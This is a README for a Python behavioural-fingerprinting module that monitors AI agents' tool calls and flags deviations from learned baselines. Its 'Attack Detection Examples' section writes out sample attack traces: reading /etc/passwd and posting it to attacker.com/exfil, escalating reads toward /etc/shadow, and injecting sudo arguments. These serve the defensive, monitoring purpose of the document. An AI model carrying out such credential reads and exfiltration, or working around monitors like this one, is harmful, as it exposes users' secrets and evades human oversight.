# Agent Behavioural Fingerprinting

> The Governor learns what "normal" looks like for each agent. When behaviour deviates, it catches what no static rule can.

**27 tests passing** · Zero external dependencies · Python 3.9+ · Thread-safe

---

## Why This Exists

Every AI agent governance tool on the market uses static rules: policy engines, prompt filters, tool allowlists. If an attacker stays within the rules, they're invisible. If an agent gradually escalates its behaviour over weeks — reading increasingly sensitive files, accessing new domains, calling tools it never called before — no policy catches it because no individual action violates a rule.

Behavioural fingerprinting solves this by learning what each agent normally does and flagging statistical deviations. It's anomaly detection built into the governance engine, powered by the tool-call data that only the Governor sees.

**The key property:** it gets more accurate with more data. After 200 evaluations, the fingerprint is "mature" and deviations are high-confidence signals. A competitor entering the market on day one has zero fingerprints. You have months of accumulated baselines across every agent your customers run. That gap widens every day.

---

## How It Works

```
Agent tool-call arrives
        │
        ▼
┌──────────────────────┐
│ Fingerprint Engine    │
│                       │
│  check() ◄── Is this │──▶ List[Deviation]
│              normal?  │    (risk boost per deviation)
│                       │
│  record() ◄── Learn  │──▶ Fingerprint updated
│              from it  │
└──────────────────────┘

Fingerprint builds over time:
  Day 1:   "learning"    (< 10 evals)  → No deviations flagged
  Day 3:   "developing"  (10-49 evals) → Deviations at 50% confidence
  Day 7:   "established" (50-199)      → Deviations at 80% confidence
  Day 30:  "mature"      (200+)        → Deviations at full confidence
```

---

## 6 Deviation Checks

| # | Check | What It Detects | Severity |
|---|-------|----------------|----------|
| 1 | **Novel Tool** | Agent uses a tool it has never used before | 25.0 |
| 2 | **Frequency Spike** | Session has far more tool calls than average | 15.0 |
| 3 | **Sequence Anomaly** | Tool-to-tool transition never observed (e.g., `read_credentials` → `http_post`) | 20.0 |
| 4 | **Argument Anomaly** | New argument keys or values for a known tool (e.g., `sudo: true` appearing) | 10.0 |
| 5 | **Velocity Spike** | Calls arriving 5x+ faster than historical baseline | 15.0 |
| 6 | **Novel Target** | Agent contacting a new domain or accessing a sensitive filesystem path | 30.0 |

Severity values scale with the fingerprint's maturity and confidence. A "developing" fingerprint flags at 50% severity; a "mature" one flags at full severity.

---

## Quick Start

### 1. Initialise

```python
from fingerprinting import FingerprintEngine

engine = FingerprintEngine(
    min_data_points=10,            # Start checking after 10 evaluations
    novel_tool_severity=25.0,      # Risk boost for novel tool
    sequence_anomaly_severity=20.0,
    target_anomaly_severity=30.0,
)
```

### 2. Integrate into Evaluation Pipeline

```python
import time

async def evaluate_action(request):
    start = time.time()
    agent_id = request.context.get("agent_id", "unknown")
    session_id = request.context.get("session_id", "default")

    # ── Check fingerprint BEFORE evaluation ──
    deviations = engine.check(agent_id, request.tool, request.args, session_id)
    fingerprint_boost = sum(d.severity for d in deviations)

    # ── Run existing evaluation pipeline ──
    result = existing_pipeline.evaluate(request)
    result.risk_score = min(result.risk_score + fingerprint_boost, 100)

    # Add deviation details to explanation
    if deviations:
        dev_summary = "; ".join(f"{d.deviation_type}(+{d.severity:.0f})" for d in deviations)
        result.explanation += f" | Fingerprint: {dev_summary}"

    # ── Record AFTER evaluation (always, regardless of decision) ──
    engine.record(
        agent_id=agent_id,
        tool=request.tool,
        args=request.args,
        decision=result.decision,
        risk_score=result.risk_score,
        latency_ms=(time.time() - start) * 1000,
        session_id=session_id,
    )

    return result
```

### 3. End Sessions

```python
# When an agent session ends, record its length
engine.end_session(agent_id, session_id)
```

### 4. Mount API Routes

```python
from fingerprinting.router import router as fp_router
app.include_router(fp_router, prefix="/fingerprint")
```

**Endpoints:**

| Method | Path | Description |
|--------|------|-------------|
| `GET` | `/fingerprint/agents` | List all fingerprinted agents with summaries |
| `GET` | `/fingerprint/agents/{id}` | Detailed fingerprint for a specific agent |
| `GET` | `/fingerprint/agents/{id}/maturity` | Current maturity level |
| `DELETE` | `/fingerprint/agents/{id}` | Reset fingerprint (start learning over) |

---

## What the Fingerprint Tracks

For each agent, the engine maintains:

### Tool Usage Profile
- Which tools the agent uses and how often (percentage distribution)
- When each tool was first and last seen
- Total evaluation count

### Session Profile
- Average number of tool calls per session
- Current session counters

### Timing Profile
- Timestamps of recent evaluations (rolling window)
- Average latency
- Velocity baseline (interval between calls)

### Risk Profile
- Historical risk score distribution
- Block/review/allow ratios

### Argument Patterns
- For each tool: which argument keys are normally present
- For string arguments: which values are common
- Flags new keys or never-seen values

### Sequence Profile
- Tool-to-tool transition counts (bigrams)
- Which tool typically follows which
- Flags novel transitions

### Target Profile
- Domains contacted (extracted from URL arguments)
- Filesystem paths accessed
- Flags novel domains and sensitive path prefixes (`/etc/`, `/root/`, `/proc/`, etc.)

---

## Maturity Model

The fingerprint's reliability depends on how much data it has:

| Level | Evaluations | Behaviour |
|-------|------------|-----------|
| **Learning** | 0–9 | Observing only. No deviations flagged. Building initial baseline. |
| **Developing** | 10–49 | Deviations detected at reduced confidence (50% severity multiplier). Useful for catching obvious anomalies. |
| **Established** | 50–199 | Reliable patterns. Deviations detected at 80% confidence. Most checks are meaningful. |
| **Mature** | 200+ | High-confidence baselines. Full severity. All 6 checks operating at peak accuracy. |

Confidence also scales within each level based on the specific data backing each check. A novel tool detection backed by 500 data points is more confident than one backed by 50.

---

## Attack Detection Examples

### Credential Exfiltration

```
Normal behaviour (200 evals):
  read_file(/data/report.txt) → summarize → respond

Attack:
  read_file(/etc/passwd) → http_post(https://attacker.com/exfil)

Deviations detected:
  ✗ novel_tool: http_post never used                    (+25.0)
  ✗ novel_target_domain: attacker.com never contacted   (+30.0)
  ✗ novel_target_path: /etc/ prefix never accessed      (+30.0)
  ✗ sequence_anomaly: read_file → http_post never seen  (+20.0)
  ─────────────────────────────────────────────────────
  Total risk boost: +105.0 (capped to remaining headroom)
```

No single static policy would catch all four signals. The fingerprint catches all of them because it knows what this specific agent normally does.

### Gradual Privilege Escalation

```
Week 1: read_file(/data/reports/*)      → Fingerprint learns this is normal
Week 2: read_file(/data/configs/*)      → New path prefix, low severity
Week 3: read_file(/var/log/auth.log)    → novel_target_path: /var/log/ (+30.0)
Week 4: read_file(/etc/shadow)          → novel_target_path: /etc/ (+30.0)
```

Each step looks innocuous in isolation. The fingerprint catches the drift because `/var/log/` and `/etc/` are sensitive prefixes this agent has never accessed.

### Automated Retry Attack

```
Normal: ~5 seconds between tool calls
Attack: 0.1 seconds between calls (bot hammering the API)

Deviation:
  ✗ velocity_spike: 50x faster than baseline (+15.0)
```

### Argument Injection

```
Normal: read_file(path="/data/report.txt")
Attack: read_file(path="/data/report.txt", sudo=True, as_root=True)

Deviations:
  ✗ arg_anomaly_new_key: "sudo" never seen for read_file  (+10.0)
  ✗ arg_anomaly_new_key: "as_root" never seen             (+10.0)
```

---

## Dashboard Integration

The fingerprint tab slots into the existing Governor dashboard as an additional tab. See `FingerprintTab.jsx` for the complete React component matching the existing design system.

```jsx
// In GovernorDashboard.jsx:
import FingerprintTab from './FingerprintTab';

// Add to tabs array:
{ id: "fingerprint", label: "🧬 Fingerprints", roles: ["admin", "operator", "auditor"] }

// Add to render:
{tab === "fingerprint" && <FingerprintTab />}
```

The tab shows:
- Agent list with maturity rings and alert badges
- Per-agent detail panel with tool distribution, learned transitions, known domains
- Active deviation alerts with severity, confidence, and baseline data point count
- Maturity progress bar for developing agents
- "No deviations" confirmation for clean agents

In production, replace the demo data in `FingerprintTab.jsx` with `fetch('/fingerprint/agents')` calls.

---

## Why This Is the Moat

| Property | Static Rules | Behavioural Fingerprinting |
|----------|-------------|---------------------------|
| Catches known attack patterns | ✅ | ✅ |
| Catches novel/unknown attacks | ❌ | ✅ |
| Catches gradual escalation | ❌ | ✅ |
| Per-agent customisation | Manual config per agent | Automatic from data |
| Accuracy over time | Constant | Improves with data |
| Replicable by competitor | Copy the rules | Need months of production data |
| Day-1 value | Full | Limited (learning phase) |
| Day-90 value | Same | Significantly higher |

A competitor can copy your policies. They can copy your chain analysis patterns. They cannot copy months of accumulated behavioural baselines across your customers' agents.

Every day the engine runs, the fingerprints get more accurate. Every new customer's data makes the detection smarter. That's a compounding advantage, not a static feature.

---

## Running Tests

```bash
cd fingerprinting
pip install pytest
PYTHONPATH=. pytest tests/ -v
```

**Expected: 27 passed**

Test coverage:
- Fingerprint basics — creation, maturity, listing (6 tests)
- Novel tool detection with confidence scaling (3 tests)
- Frequency spike detection (1 test)
- Sequence anomaly detection (2 tests)
- Argument anomaly detection (2 tests)
- Velocity spike detection (1 test)
- Target anomaly — novel domains and sensitive paths (3 tests)
- Integration scenarios — credential exfil, gradual escalation, multi-agent independence (3 tests)
- Deviation data structure (2 tests)
- Edge cases — empty args, unicode, long values, concurrent sessions (4 tests)

---

## Configuration

```python
FingerprintEngine(
    min_data_points=10,              # Evals before deviation checks activate
    novel_tool_severity=25.0,        # Risk boost: agent uses unknown tool
    frequency_spike_severity=15.0,   # Risk boost: session length anomaly
    sequence_anomaly_severity=20.0,  # Risk boost: unusual tool transition
    arg_anomaly_severity=10.0,       # Risk boost: new arg keys/values
    velocity_spike_severity=15.0,    # Risk boost: rapid-fire calls
    target_anomaly_severity=30.0,    # Risk boost: new domain or sensitive path
)
```

All severities are pre-multiplied by the maturity confidence factor (0.5 for developing, 0.8 for established, 1.0 for mature).

---

## Requirements

```
fastapi>=0.100.0    # For API router only
```

The core engine (`fingerprinting/__init__.py`) uses Python stdlib only — `collections`, `threading`, `time`, `dataclasses`. Zero external dependencies. Thread-safe via `threading.Lock`.

---

## Sovereign Core Alignment

Behavioural Fingerprinting is **Layer 3 (Adaptive Reasoning)** of the NOVTIA Sovereign Core architecture:

| Layer | Name | Status |
|-------|------|--------|
| L1 | Orchestration | ✅ Shipping (Governor pipeline) |
| L2 | Chain of Trust | ✅ Shipping (SURGE v2 receipts) |
| **L3** | **Adaptive Reasoning** | **✅ Shipping (Fingerprinting)** |
| L4 | Neuro-Symbolic Cognition | 🔬 Research (future: combine symbolic rules + learned models) |

L3 is the transition from static governance to adaptive governance — rules that learn from data rather than being manually written.

---

**Built by Othniel Obasi · NOVTIA · March 2026**
